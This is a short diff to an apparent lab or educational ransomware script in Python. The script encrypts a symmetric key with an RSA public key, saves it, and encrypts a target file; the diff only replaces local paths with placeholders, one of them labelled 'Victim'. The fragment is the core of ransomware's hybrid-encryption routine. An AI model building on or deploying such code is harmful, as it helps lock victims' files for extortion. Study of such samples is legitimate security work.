@@ -7,7 +7,7 @@ from cryptography.fernet import Fernet
 symmetricKey = Fernet.generate_key()
 FernetInstance = Fernet(symmetricKey)
 
-with open("/home/prof/Desktop/Ransomware/public_key.key", "rb") as key_file:
+with open("/path/to/Ransomware/public_key.key", "rb") as key_file:
     public_key = serialization.load_pem_public_key(
         key_file.read(),
         backend=default_backend()
@@ -22,7 +22,7 @@ encryptedSymmetricKey = public_key.encrypt(
 )
 with open("encryptedSymmertricKey.key", "wb") as key_file:
     key_file.write(encryptedSymmetricKey)
-    filePath = "/home/kali/Desktop/Ransomware/FileToEncrypt.txt"
+    filePath = "/path/to/Victim/FileToEncrypt.txt"
 with open(filePath, "rb") as file:
     file_data = file.read()
     encrypted_data = FernetInstance.encrypt(file_data)
